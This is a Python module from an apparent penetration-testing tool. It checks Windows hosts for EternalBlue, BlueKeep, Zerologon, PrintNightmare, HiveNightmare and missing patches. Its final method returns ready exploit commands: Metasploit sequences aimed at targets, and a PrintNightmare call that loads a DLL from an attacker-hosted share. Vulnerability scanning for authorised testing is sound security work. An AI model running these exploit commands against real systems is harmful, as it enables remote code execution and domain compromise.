#!/usr/bin/env python3
"""
NexusPen - Windows Vulnerability Scanner Module
=================================================
Windows-specific vulnerability detection.
"""

import subprocess
import re
from typing import Dict, List, Optional
from dataclasses import dataclass

from rich.console import Console
from rich.table import Table

console = Console()


@dataclass 
class WindowsVulnerability:
    """Windows vulnerability."""
    name: str
    cve: str
    severity: str
    description: str
    affected_versions: List[str]
    check_method: str
    exploit_available: bool = False
    exploit_module: Optional[str] = None


class WindowsVulnScanner:
    """
    Windows vulnerability scanner.
    """
    
    # Known Windows CVEs
    KNOWN_CVES = {
        'MS17-010': {
            'cve': 'CVE-2017-0144',
            'name': 'EternalBlue',
            'severity': 'critical',
            'description': 'SMBv1 Remote Code Execution',
            'affected': ['Windows 7', 'Windows Server 2008', 'Windows Server 2008 R2'],
            'exploit': 'exploit/windows/smb/ms17_010_eternalblue',
            'check_port': 445,
        },
        'MS08-067': {
            'cve': 'CVE-2008-4250',
            'name': 'Conficker',
            'severity': 'critical',
            'description': 'Server Service Remote Code Execution',
            'affected': ['Windows XP', 'Windows Server 2003'],
            'exploit': 'exploit/windows/smb/ms08_067_netapi',
            'check_port': 445,
        },
        'CVE-2020-1472': {
            'cve': 'CVE-2020-1472',
            'name': 'Zerologon',
            'severity': 'critical',
            'description': 'Netlogon Elevation of Privilege',
            'affected': ['Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2016', 'Windows Server 2019'],
            'exploit': 'auxiliary/admin/dcerpc/cve_2020_1472_zerologon',
            'check_port': 135,
        },
        'CVE-2021-34527': {
            'cve': 'CVE-2021-34527',
            'name': 'PrintNightmare',
            'severity': 'critical',
            'description': 'Print Spooler Remote Code Execution',
            'affected': ['Windows 7', 'Windows 8.1', 'Windows 10', 'Windows Server 2008-2019'],
            'exploit': 'exploit/windows/dcerpc/cve_2021_1675_printnightmare',
            'check_port': 445,
        },
        'CVE-2021-1675': {
            'cve': 'CVE-2021-1675',
            'name': 'PrintNightmare (LPE)',
            'severity': 'high',
            'description': 'Print Spooler Local Privilege Escalation',
            'affected': ['Windows 7', 'Windows 8.1', 'Windows 10'],
            'check_port': None,
        },
        'CVE-2021-36934': {
            'cve': 'CVE-2021-36934',
            'name': 'HiveNightmare/SeriousSAM',
            'severity': 'high',
            'description': 'SAM Database Accessible',
            'affected': ['Windows 10 1809+'],
            'check_port': None,
        },
        'CVE-2022-26923': {
            'cve': 'CVE-2022-26923',
            'name': 'AD CS Domain Escalation',
            'severity': 'high',
            'description': 'Active Directory Certificate Services Privilege Escalation',
            'affected': ['Windows Server 2012-2022'],
            'check_port': None,
        },
        'CVE-2019-0708': {
            'cve': 'CVE-2019-0708',
            'name': 'BlueKeep',
            'severity': 'critical',
            'description': 'RDP Remote Code Execution',
            'affected': ['Windows 7', 'Windows Server 2008', 'Windows Server 2008 R2'],
            'exploit': 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce',
            'check_port': 3389,
        },
        'CVE-2020-0796': {
            'cve': 'CVE-2020-0796',
            'name': 'SMBGhost',
            'severity': 'critical',
            'description': 'SMBv3 Remote Code Execution',
            'affected': ['Windows 10 1903', 'Windows 10 1909', 'Windows Server 2019'],
            'exploit': 'exploit/windows/smb/cve_2020_0796_smbghost',
            'check_port': 445,
        },
        'CVE-2021-42278': {
            'cve': 'CVE-2021-42278',
            'name': 'sAMAccountName Spoofing',
            'severity': 'high',
            'description': 'AD Privilege Escalation via Computer Account',
            'affected': ['Windows Server 2008-2022'],
            'check_port': None,
        },
        'CVE-2021-42287': {
            'cve': 'CVE-2021-42287',
            'name': 'noPac',
            'severity': 'high',
            'description': 'AD Privilege Escalation',
            'affected': ['Windows Server 2008-2022'],
            'check_port': None,
        },
    }
    
    def __init__(self, target: str = None):
        self.target = target
        self.findings: List[WindowsVulnerability] = []
    
    def check_ms17_010(self) -> Optional[WindowsVulnerability]:
        """Check for MS17-010 (EternalBlue)."""
        console.print("\n[cyan]🔍 Checking MS17-010 (EternalBlue)...[/cyan]")
        
        if not self.target:
            return None
        
        try:
            result = subprocess.run(
                ['nmap', '-p', '445', '--script', 'smb-vuln-ms17-010', self.target],
                capture_output=True, text=True, timeout=60
            )
            
            if 'VULNERABLE' in result.stdout:
                vuln = WindowsVulnerability(
                    name='EternalBlue (MS17-010)',
                    cve='CVE-2017-0144',
                    severity='critical',
                    description='SMBv1 Remote Code Execution',
                    affected_versions=['Windows 7', 'Server 2008'],
                    check_method='nmap smb-vuln-ms17-010',
                    exploit_available=True,
                    exploit_module='exploit/windows/smb/ms17_010_eternalblue'
                )
                self.findings.append(vuln)
                console.print("[red]  ⚠️ VULNERABLE to EternalBlue![/red]")
                return vuln
                
        except Exception as e:
            console.print(f"[dim]Error: {e}[/dim]")
        
        return None
    
    def check_bluekeep(self) -> Optional[WindowsVulnerability]:
        """Check for BlueKeep (CVE-2019-0708)."""
        console.print("\n[cyan]🔍 Checking CVE-2019-0708 (BlueKeep)...[/cyan]")
        
        if not self.target:
            return None
        
        try:
            result = subprocess.run(
                ['nmap', '-p', '3389', '--script', 'rdp-vuln-ms12-020', self.target],
                capture_output=True, text=True, timeout=60
            )
            
            # Also try metasploit scanner
            # auxiliary/scanner/rdp/cve_2019_0708_bluekeep
            
            if 'VULNERABLE' in result.stdout:
                vuln = WindowsVulnerability(
                    name='BlueKeep',
                    cve='CVE-2019-0708',
                    severity='critical',
                    description='RDP Remote Code Execution',
                    affected_versions=['Windows 7', 'Server 2008'],
                    check_method='nmap/metasploit scanner',
                    exploit_available=True,
                    exploit_module='exploit/windows/rdp/cve_2019_0708_bluekeep_rce'
                )
                self.findings.append(vuln)
                console.print("[red]  ⚠️ VULNERABLE to BlueKeep![/red]")
                return vuln
                
        except Exception as e:
            console.print(f"[dim]Error: {e}[/dim]")
        
        return None
    
    def check_smbghost(self) -> Optional[WindowsVulnerability]:
        """Check for SMBGhost (CVE-2020-0796)."""
        console.print("\n[cyan]🔍 Checking CVE-2020-0796 (SMBGhost)...[/cyan]")
        
        if not self.target:
            return None
        
        try:
            result = subprocess.run(
                ['nmap', '-p', '445', '--script', 'smb-protocols', self.target],
                capture_output=True, text=True, timeout=60
            )
            
            # SMBv3.1.1 with compression = potentially vulnerable
            if 'SMBv3' in result.stdout:
                console.print("[yellow]  ⚠️ SMBv3 detected - manual verification needed[/yellow]")
                
        except Exception as e:
            console.print(f"[dim]Error: {e}[/dim]")
        
        return None
    
    def check_zerologon(self) -> Optional[WindowsVulnerability]:
        """Check for Zerologon (CVE-2020-1472)."""
        console.print("\n[cyan]🔍 Checking CVE-2020-1472 (Zerologon)...[/cyan]")
        
        if not self.target:
            return None
        
        # Requires domain controller
        console.print("[dim]  Zerologon requires DC - use Metasploit auxiliary module[/dim]")
        
        return None
    
    def check_printnightmare(self) -> Optional[WindowsVulnerability]:
        """Check for PrintNightmare (CVE-2021-34527)."""
        console.print("\n[cyan]🔍 Checking CVE-2021-34527 (PrintNightmare)...[/cyan]")
        
        if not self.target:
            return None
        
        try:
            # Check if spooler is running
            result = subprocess.run(
                ['rpcdump.py', self.target],
                capture_output=True, text=True, timeout=30
            )
            
            if 'spoolss' in result.stdout.lower():
                vuln = WindowsVulnerability(
                    name='PrintNightmare',
                    cve='CVE-2021-34527',
                    severity='critical',
                    description='Print Spooler RCE - Spooler service running',
                    affected_versions=['Windows 7-10', 'Server 2008-2019'],
                    check_method='rpcdump spoolss check',
                    exploit_available=True,
                    exploit_module='CVE-2021-1675.py'
                )
                self.findings.append(vuln)
                console.print("[yellow]  ⚠️ Print Spooler running - potentially vulnerable[/yellow]")
                return vuln
                
        except Exception as e:
            console.print(f"[dim]Error: {e}[/dim]")
        
        return None
    
    def check_hivenightmare(self) -> Optional[WindowsVulnerability]:
        """Check for HiveNightmare (CVE-2021-36934)."""
        console.print("\n[cyan]🔍 Checking CVE-2021-36934 (HiveNightmare)...[/cyan]")
        
        try:
            # Check SAM file permissions
            result = subprocess.run(
                ['icacls', 'C:\\Windows\\System32\\config\\SAM'],
                capture_output=True, text=True, timeout=10
            )
            
            if 'BUILTIN\\Users' in result.stdout and '(I)(RX)' in result.stdout:
                vuln = WindowsVulnerability(
                    name='HiveNightmare/SeriousSAM',
                    cve='CVE-2021-36934',
                    severity='high',
                    description='SAM database readable by users',
                    affected_versions=['Windows 10 1809+'],
                    check_method='icacls SAM check',
                    exploit_available=True
                )
                self.findings.append(vuln)
                console.print("[red]  ⚠️ VULNERABLE to HiveNightmare![/red]")
                return vuln
                
        except Exception as e:
            console.print(f"[dim]Error: {e}[/dim]")
        
        return None
    
    def check_missing_patches(self) -> List[Dict]:
        """Check for missing patches using WMI."""
        console.print("\n[cyan]🔍 Checking installed patches...[/cyan]")
        
        try:
            result = subprocess.run(
                ['wmic', 'qfe', 'get', 'HotFixID'],
                capture_output=True, text=True, timeout=30
            )
            
            installed_patches = set()
            for line in result.stdout.split('\n'):
                if 'KB' in line:
                    installed_patches.add(line.strip())
            
            console.print(f"[dim]  Found {len(installed_patches)} installed patches[/dim]")
            
            return list(installed_patches)
            
        except Exception as e:
            console.print(f"[dim]Error: {e}[/dim]")
            return []
    
    def run_full_scan(self) -> List[WindowsVulnerability]:
        """Run all vulnerability checks."""
        console.print("\n[bold red]═══════════════════════════════════════════════════════════[/bold red]")
        console.print("[bold red]           WINDOWS VULNERABILITY SCAN                       [/bold red]")
        console.print("[bold red]═══════════════════════════════════════════════════════════[/bold red]")
        
        if self.target:
            self.check_ms17_010()
            self.check_bluekeep()
            self.check_smbghost()
            self.check_zerologon()
            self.check_printnightmare()
        
        self.check_hivenightmare()
        self.check_missing_patches()
        
        self.display_results()
        return self.findings
    
    def display_results(self):
        """Display findings."""
        if not self.findings:
            console.print("\n[green]No vulnerabilities found![/green]")
            return
        
        table = Table(title=f"Vulnerabilities ({len(self.findings)})", show_header=True,
                     header_style="bold red")
        table.add_column("CVE", style="cyan", width=18)
        table.add_column("Name", width=20)
        table.add_column("Severity", width=10)
        table.add_column("Exploit", width=10)
        
        for vuln in self.findings:
            sev_color = {'critical': 'red', 'high': 'orange1', 'medium': 'yellow', 'low': 'green'}.get(vuln.severity, 'white')
            table.add_row(
                vuln.cve,
                vuln.name,
                f"[{sev_color}]{vuln.severity.upper()}[/{sev_color}]",
                "[green]Yes[/green]" if vuln.exploit_available else "[dim]No[/dim]"
            )
        
        console.print(table)
    
    @staticmethod
    def get_exploit_commands() -> Dict[str, str]:
        """Get exploit commands for known vulnerabilities."""
        return {
            'eternalblue': '''
# Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
set LHOST <attacker>
exploit
''',
            'bluekeep': '''
# Metasploit (DANGEROUS - may BSOD)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <target>
set LHOST <attacker>
set TARGET 1  # Make sure to set correct target
exploit
''',
            'zerologon': '''
# Using cve-2020-1472-exploit.py
python3 cve-2020-1472-exploit.py DC_NAME DC_IP

# Or Metasploit
use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
set RHOSTS <dc_ip>
set NBNAME <dc_name>
exploit
''',
            'printnightmare': '''
# CVE-2021-1675.py
python3 CVE-2021-1675.py 'domain.local/user:password'@target '\\\\attacker\\share\\evil.dll'
''',
        }
